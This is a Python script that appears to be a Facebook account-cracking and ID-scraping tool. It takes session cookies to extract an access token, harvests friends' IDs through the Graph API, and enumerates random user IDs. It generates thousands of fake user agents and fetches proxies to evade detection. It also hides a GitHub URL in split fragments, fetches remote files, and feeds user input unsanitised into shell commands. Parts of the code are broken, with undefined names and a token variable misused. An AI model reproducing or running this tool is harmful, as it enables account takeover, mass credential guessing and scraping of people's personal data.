#coding=utf-8
import os,sys,time,json,random,re,string,platform,base64,uuid
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except ModuleNotFoundError:
 os.system('pip install --upgrade pip && pip install requests futures==2 > /dev/null')
 os.system('python All-in1.py')
logo="""$$\      $$\ $$\   $$\ $$\   $$\  $$$$$$\  
$$$\    $$$ |$$ |  $$ |$$$\  $$ |$$  __$$\ 
$$$$\  $$$$ |$$ |  $$ |$$$$\ $$ |$$ /  $$ |
$$\$$\$$ $$ |$$ |  $$ |$$ $$\$$ |$$$$$$$$ |
$$ \$$$  $$ |$$ |  $$ |$$ \$$$$ |$$  __$$ |
$$ |\$  /$$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |
$$ | \_/ $$ |\$$$$$$  |$$ | \$$ |$$ |  $$ |
\__|     \__| \______/ \__|  \__|\__|  \__|
--------------------------------------"""
MUNA = []
for xd in range(10000):
    aa='Mozilla/5.0 (X11; Linux x86_64)'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c='AppleWebKit/537.36 (KHTML, like Gecko);'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Chrome'
    h=random.randrange(73,100)
    i='/106.0.0.0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    MUNA.append(uaku2)


def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Expired Application Details :'%(M))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print(f'\r')
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie\n'%(N,M,N))
loop = 0
ok = []
cp = []
tf = []
ua_android = []
ua_opera = []
#split_function

za = 'h'
'''
 
'''
aa = 'https://raw.githubusercontent.com/'
'''
 
'''
zb = 't'
'''
 
'''
ab = 'lawhskn'
'''
 
'''
zc = 't'
zd = 'p'
ze = 's'
'''

 '''
ae = 'main'
zf = ':'
zg = '//'
zh = 'git'
'''
 
'''
zi = 'hub.'
zj = 'com/'
zk = 'z'
zl = 'a'
zm = 'i'
'''
 
'''
zn = 'd'
zo = 'r'
'''
 

'''
zp = 'a'
zq = 'o'
bypass = za+zb+zc+zd+ze+zf+zg+zh+zi+zj+zk+zl+zm+zn+zo+zp+zq
isqadar = aa+ab+'/'+ze+'/'+ae+'/'+ze
for xd in range(1000):
    android = 'Opera/9.80 (Android; Opera Mini/'
    black_berry = 'Opera/9.80 (BlackBerry; Opera Mini/'
    av = str(random.randrange(1, 30))
    ab = str(random.randrange(1, 9))
    ac = ''.join(random.choice(string.digits) for _ in range(4))
    ad = '/191.269; U; en-PK) Presto/2.12.423 Version/12.16'
    op_and = android+av+'.'+ab+'.'+ac+'.'+ad
    op_bberry = black_berry+av+'.'+ab+'.'+ac+'.'+ad
    ua_opera.append(op_and)
    ua_opera.append(op_bberry)
#ua_opera.append(open('ua.txt', 'r').read().splitlines())
url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"

dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"

aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"

###########################################################################################

## RANDOM UA

user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"

uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"

uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"

uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"

uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"

uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"

uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"

uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"

uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])

# lempankkkkkkkk

ugen2=[]

ugen=[]
def get_proxy_socks5():
	max_proxy = "100000"
	kontol_prox = ['https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all']
	kontol_prox = ["https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout={max_proxy}&country=all&ssl=all&anonymity=all","https://api.proxyscrape.com/?request=displayproxies&protocol=all&timeout={max_proxy}&country=all&ssl=all&anonymity=all"]
	open("data/prox_socks5.txt","w")
	for name_prox in kontol_prox:
		try:
			proxz = requests.get(name_prox).text.strip()
			open("data/prox_socks5.txt","a").write(proxz)
			file = open("data/prox_socks5.txt","r").readlines()
			for crot in file:
				crot = crot.replace("\n","")
				prox_.append(crot)
		except requests.exceptions.ConnectionError:
			kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
			os.sys.exit()
def get_proxy_socks4():
	try:
		proxf = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
		open("data/prox_socks4.txt",'w').write(proxf)
	except requests.exceptions.ConnectionError:
		kotak("# UPS... SEPERTINYA JARINGAN ANDA TERPUTUS",M,C)
		os.sys.exit()

try:

    prox= requests.get('https://raw.githubusercontent.com/MAHADI-143/BDMC/main/.prox.txt').text

    open('.prox.txt','w').write(prox)

except Exception as e:
	os.system ("clear")
prox=open('.prox.txt','r').read().splitlines()
def buat_ugen(self):
		global ugen_
	#	{str(rc(aZ))}
	#	{str(rr(111,999))}
		rr = random.randint
		rc = random.choice
		aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
		aZ10 = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9','0']


		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=C, justify="center", width=60)
		tod.add_row(f"1\n2",f"UserAgent Bawaan\nManual")
		sol().print(tod, justify='center')

		pilih_ = input(f">--Pilih 1-5--> {q}")
		if pilih_ in ("1","01"):
			for x in range(2000):
				A = f'Mozilla/5.0 (SymbianOS/9.4; Series60/5.0; Android {str(rr(7,10))};'
				B = f' MI 4LTE Build/{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}63{str(rc(aZ))}; ) AppleWebKit/537.36 (KHTML, like Gecko) UCBrowser/'
				C = f'10.9.2.{str(rr(111,999))} U3/0.8.0 Mobile Safari/534.30'
				A__ = f'Mozilla/5.0 (Linux; U; Android {str(rr(1,10))}.{str(rr(1,10))}.{str(rr(1,10))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
				A_ = f'Mozilla/5.0 (Linux; U; Android {str(rr(7,12))}; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
				A_ = f'Mozilla/5.0 (Linux; U; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'
				B_ = f'{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}{str(rc(aZ10))}'
				B_ = f'{str(rc(aZ))}{str(rc(aZ))}{str(rc(aZ))}{str(rr(11,99))}{str(rc(aZ))}'
				C_ = f'{str(rr(30,57))} Build/{B_}) AppleWebKit/537.36 (KHTML, like Gecko)'
				D_ = f' Version/4.0 Chrome/{str(rr(20,100))}.0.{str(rr(1111,9999))}.80 Mobile Safari/'
				E_ = f'537.36 HeyTapBrowser/{str(rr(2,40))}.7.36.1'


				F_ = f'{A_}{C_}{D_}{E_}'
				if F_ in ugen_:pass
				else:ugen_.append(F_)
#				F_ = f'{A__}{C_}{D_}{E_}'
#				if F_ in ugen_:pass
#				else:ugen_.append(F_)
    

for xd in range(10000):

    a='Mozilla/5.0 (Symbian/3; Series60/'

    b=random.randrange(1, 9)

    c=random.randrange(1, 9)

    d='Nokia'

    e=random.randrange(100, 9999)

    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

    g=random.randrange(1, 9)

    h=random.randrange(1, 4)

    i=random.randrange(1, 4)

    j=random.randrange(1, 4)

    k='Mobile Safari/535.1'

    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['6','7','8','9','10','11','12'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    
    
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()
def exit():
    os.sys.exit()
def show(text):
    print(text)
    print(50*'-')
def login():
    os.system('clear')
    print(logo)
    #print('\n\033[1;97m If you donot know how to get cookies, see option in main menu\033[0;97m')
    cookies = input('\n Put cookies here: ')
    try:
        print('\n Checking cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
        find_token = re.search("(EAAG\w+)", data.text)
        open("access_token.txt", "w").write(find_token.group(1))
        open("fb_cookies.txt","w").write(cookies)
        print(' Logged in successfully ...')
        time.sleep(1)
        os.system('python SUBHAN.py')
    except KeyError:
        print('\n Inavlid cookies, try another cookies')
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
    except AttributeError:
        print('\n Invalid cookies, try another cookies ...')
        exit()
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print('\n\033[0;97m  File not found on provided path, try again ...\033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;97m Example: /sdcard/rana.txt\033[0;97m')
    new_save = input(' Save new file as: ')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    main()
def remove_dub():
    os.system('clear')
    print(logo)
    print(' Dublicate links remover ...')
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print('\n\033[1;97m Example: /sdcard/ranaidz.txt\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate links has been removed from file')
        print(' Result file saved as: '+save_file)
        print(50*'-')
        input('\n Press enter to back ')
        main()
    except FileNotFoundError:
        print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
def main():
    os.system('clear && rm -rf .txt .t.txt')
    print(logo)
    print('\033[1;37m[1] FILE CRACK')
    print('\033[1;37m[2] RANDOM CRACK')
    print('\033[1;37m[3] FILE CREATE')
    print('\033[1;37m[4] RANDOM FILE MAKER')
    print('\033[1;37m[5] IDS SEPRATE FILE')
    print('\033[1;37m[6] REMOVE DUBLICATE FILE')
    print('\033[1;37m[0] \033[1;37mLOGOUT ACCOUNT')
    print('\033[1;37m------------------------------------------------')
    opt = input(' Choose option :  ')
    if opt =='1':
        file_crack()
    elif opt =='2':
        random()
    elif opt =='3':
        create_file_login()
    elif opt =='4':
        create_file_nologin()
    elif opt =='5':
        sids()
    elif opt =='6':
        remove_dub()
        login()
    elif opt =='0':
        os.system('rm -rf fb_cookies.txt')
    else:
        print('\n Choose valid option ... ')

       
def create_file_nologin():
    os.system('clear')
    print(logo)
    print('\033[1;97m Example: 5000,500,300,700,900 ...\033[0;97m')
    limit = int(input(' How many ids do you want to add ? '))
    print('\n\033[1;97m Example: /sdcard/filename.txt\033[0;97m')
    sf = input(' Save file in: ')
    print('\033[1;37m------------------------------------------------')
    tc = 0
    while tc < limit:
        nmp = ''.join(random.choice(string.digits) for _ in range(11))
        uid = '1000'+nmp
        ng = requests.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uid+'&flow=login_no_pin&refsrc=deprecated&_rdr').text
        try:
            coll = re.search('class="t m" alt="(.*?)"',str(ng)).group(1)
            spl = coll.split(',')[0]
            open(sf,'a').write(uid+'|'+spl+'\n')
            tc +=1
            sys.stdout.write('\r Successfully added %s ids...\r'%(tc)),sys.stdout.flush()
        except Exception as e:
            pass
    print(' File created successfully')
    input('\n Press enter to back ')
    main()
def create_file_login():
    try:
        fb = open('fb_cookies.txt', 'r').read()
        fb_token = str(open('access_token.txt', 'r').read())
        fb_cookies = {'cookie':str(fb)}
    except FileNotFoundError:
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ....')
        exit()
    try:
        graph_url = 'https://graph.facebook.com/me?fields=id,name&access_token=%s'%(fb_cookies)
        xyz = requests.Session()
        r = xyz.get(graph_url,cookies=fb_cookies).text
        data = json.loads(r)
        iid = data['id']
        name = data['name']
    except requests.exceptions.ConnectionError:
        print('  No internet connection ... ')
        exit()
    except KeyError:
        print(' Logged in account has checkpoint, try another account ...')
        os.system('rm -rf fb_cookies.txt access_token.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print(logo)
    print(' Login id: '+id)
    print(' Login name: '+name)
    print('\033[1;37m------------------------------------------------')
    print('\033[1;37m[1] CREATE FROM PUBLIC LIST')
    print('\033[1;37m[2]CREATE FALLOWER LIST')
    print('\033[1;37m[+] Back')
    print('\033[1;37m------------------------------------------------')
    opt = input(' CHOOSE OPTION ')
    if opt =='1':
        print('\n\n\033[1;37m[1] CREATE AUTO FILE')
        print('\033[1;37m[2] CREATE MENUAL')
        print('\033[1;37m------------------------------------------------')
        opt2 = input(' CHOOSE ')
        if opt2 =='1':
            os.system('clear')
            print(logo)
            try:
                li = int(input(' How many ids do you want to add ? '))
            except:
                li = 1
            #params
            print('\n\033[1;97m Example: /sdcard/ranaidz.txt\033[0;97m')
            fsi = input(' Save file as: ')
            if '/sdcard/' in fsi:
                fs = fsi
            else:
                fs = '/sdcard/'+fsi
            yar = []
            tc = []
            t = 0
            for _ in range(li):
                t +=1
                idt = str(input(' Put id no %s: '%t))
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,fb_token)
                xyz = requests.Session()
                fd = xyz.get(fd_url,cookies=fb_cookies).text
                fl = json.loads(fd)
                for i in fl['friends']['data']:
                    uid = i['id']
                    if uid in yar:
                        pass
                    else:
                        open('.txt', 'a').write(uid+'\n')
                        yar.append(uid)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(yar)))
            print('\033[1;37m------------------------------------------------')
            try:
                li2 = int(input(' How many ids do you want to extract ? '))
            except:
                li2 = 1
            print('\n\033[1;97m Link example: 100080,100081,100082,100083,100085 etc \033[0;97m')
            t=0
            for f in range(li2):
                t+=1
                sid = input(' %s link start with: '%t)
                os.system('cat .txt | grep "'+sid+'" > .t.txt')
            file_open = open('.t.txt', 'r').read().splitlines()
            #tc.append(file_open)
            os.system('clear')
            print(logo)
            print(' Total ids: '+str(len(file_open)))

            print('\033[1;37m------------------------------------------------')
            for iidss in file_open:
                try:
                    relax = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(iidss,fb_token)
                    yaad = xyz.get(relax,cookies=fb_cookies).text
                    rd = json.loads(yaad)
                    for fq in rd['friends']['data']:
                        idss = fq['id']
                        fnames = fq['name']
                        open(fs,'a').write(idss+'|'+fnames+'\n')
                        sys.stdout.write('\r\033[1;32m  Ex ids from:  %s ...\033[0;97m\r'%(iidss)),sys.stdout.flush()
                except KeyError:
                    if 'enrolled' in rd:
                        sys.stdout.write('\r\033[1;31m  Cookies expired, not ex from: %s \033[0;97m\r'%(iidss)),sys.stdout.flush()
                        os.system('rm -rf fb_cookies.txt access_token.txt')
                        exit()
                    else:
                        sys.stdout.write('\r\033[1;97m  No friends for: %s ...\033[0;97m\r'%(iidss)),sys.stdout.flush()
                except requests.exceptions.ConnectionError:
                    print(' No internet connection ...')
                    pass
            print(50*'-')
            print(' The process has completed')
